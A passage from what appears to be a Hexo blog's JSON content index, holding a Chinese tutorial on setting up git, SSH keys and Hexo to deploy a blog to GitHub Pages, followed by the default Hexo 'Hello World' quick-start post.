-v\nv8.5.1\n```\n\n安装的是长期版本，搭建**hexo**已经够用了\n\n## git\n\n```bash\n$ sudo apt-get install git-core\n```\n\n### 通过ssh方式链接github账户\n\n```bash\n$ git config --global user.email \"example@xx.com\"\n$ git config --global user.name \"xxx\"\n#本地生成密钥\n$ ssh-keygen -b 4096 -t rsa -C \"example@xx.com\"\n#生成后将该密钥加入到你的ssh中\n$ ssh-add ~/.ssh/id_rsa\n```\n\n然后打开**github**\n\n进入**setting**选择**SSH and GPG keys**，点击**New SSH key**\n\n取一个合适的名字，并将生成的**id_rsa.pub**中的内容复制到key中\n\n```bash\n#以ssh方式clone创建好的github pages库\n$ git clone git@github.com:xlccccc/xlccccc.github.io.git\n```\n\n此时能正常`git push`就是成功链接了\n\n(记得打开Pages，以及github学生包可以白嫖一个**.me**后缀域名)\n\n## hexo\n\n### 本地\n\n```bash\n#只有root权限才安装成功了，原因未知\n$ sudo npm install -g hexo-cli\n$ hexo init blog\n$ cd blog\n$ npm install\n#重新生成静态博客的所有内容\n$ hexo generate\n#重启 hexo 本地服务\n$ hexo server\n#安装git插件\n$ npm install hexo-deployer-git --save\n```\n\n此时访问 https://localhost:4000 可以看到本地博客页面\n\n### github pages\n\n在**_config.yml**的最后一行添加\n\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:xlccccc/xlccccc.github.io.git\n  branch: master\n```\n\n更改url为你的`github pages`\n\n```bash\n$ hexo clean\n$ hexo generate\n$ hexo deploy\n```\n\n此时访问 https://xlccccc.github.io 就可看到博客啦\n\n```bash\n$ hexo new photo \"My Gallery\"\n$ hexo generate\n$ hexo deploy\n```\n\n如果改了域名，在source下新建CNAME，内容为你的域名(如`xlccccc.me`)，然后`hexo generate` `hexo deploy`即可\n\n","tags":["dev"]},{"title":"Hello World","url":"/2022/11/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]